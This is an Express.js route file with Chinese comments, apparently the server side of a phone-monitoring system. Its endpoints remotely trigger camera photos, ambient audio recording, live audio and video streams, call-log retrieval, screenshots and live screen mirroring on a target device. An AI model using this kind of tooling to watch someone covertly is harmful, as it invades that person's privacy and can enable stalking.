/**
 * 设备控制路由
 */

const express = require('express');
const router = express.Router();
const { body, param } = require('express-validator');
const { validateRequest } = require('../middleware/validator');
const { checkDevicePermission } = require('../middleware/permission');
const controlController = require('../controllers/controlController');

/**
 * 远程拍照
 */
router.post('/photo/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('camera').isIn(['front', 'back']).withMessage('摄像头类型必须是front或back'),
  body('quality').optional().isIn(['low', 'medium', 'high']).withMessage('照片质量无效'),
  validateRequest,
  checkDevicePermission
], controlController.takePhoto);

/**
 * 环境录音
 */
router.post('/audio/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('duration').isIn([120, 300, 1200]).withMessage('录音时长必须是2、5或20分钟'),
  body('quality').optional().isIn(['low', 'medium', 'high']).withMessage('录音质量无效'),
  validateRequest,
  checkDevicePermission
], controlController.recordAudio);

/**
 * 远程录像
 */
router.post('/video/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('camera').isIn(['front', 'back']).withMessage('摄像头类型必须是front或back'),
  body('duration').isIn([60, 180, 600]).withMessage('录像时长必须是1、3或10分钟'),
  body('quality').optional().isIn(['low', 'medium', 'high']).withMessage('录像质量无效'),
  validateRequest,
  checkDevicePermission
], controlController.recordVideo);

/**
 * 实况语音追踪
 */
router.post('/live-audio/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.startLiveAudio);

/**
 * 停止实况语音追踪
 */
router.delete('/live-audio/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.stopLiveAudio);

/**
 * 实况视频追踪
 */
router.post('/live-video/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('camera').optional().isIn(['front', 'back']).withMessage('摄像头类型必须是front或back'),
  validateRequest,
  checkDevicePermission
], controlController.startLiveVideo);

/**
 * 停止实况视频追踪
 */
router.delete('/live-video/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.stopLiveVideo);

/**
 * 切换摄像头
 */
router.post('/switch-camera/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('camera').isIn(['front', 'back']).withMessage('摄像头类型必须是front或back'),
  validateRequest,
  checkDevicePermission
], controlController.switchCamera);

/**
 * 获取通话记录
 */
router.post('/call-logs/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.getCallLogs);

/**
 * 截屏
 */
router.post('/screenshot/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('quality').optional().isIn(['low', 'medium', 'high']).withMessage('截屏质量无效'),
  validateRequest,
  checkDevicePermission
], controlController.takeScreenshot);

/**
 * 录屏
 */
router.post('/screen-record/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  body('duration').isInt({ min: 10, max: 600 }).withMessage('录屏时长必须在10-600秒之间'),
  body('quality').optional().isIn(['low', 'medium', 'high']).withMessage('录屏质量无效'),
  validateRequest,
  checkDevicePermission
], controlController.recordScreen);

/**
 * 实时同屏
 */
router.post('/live-screen/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.startLiveScreen);

/**
 * 停止实时同屏
 */
router.delete('/live-screen/:deviceId', [
  param('deviceId').isInt().withMessage('设备ID必须是数字'),
  validateRequest,
  checkDevicePermission
], controlController.stopLiveScreen);

/**
 * 查询任务状态
 */
router.get('/task/:taskId', [
  param('taskId').notEmpty().withMessage('任务ID不能为空'),
  validateRequest
], controlController.getTaskStatus);

module.exports = router;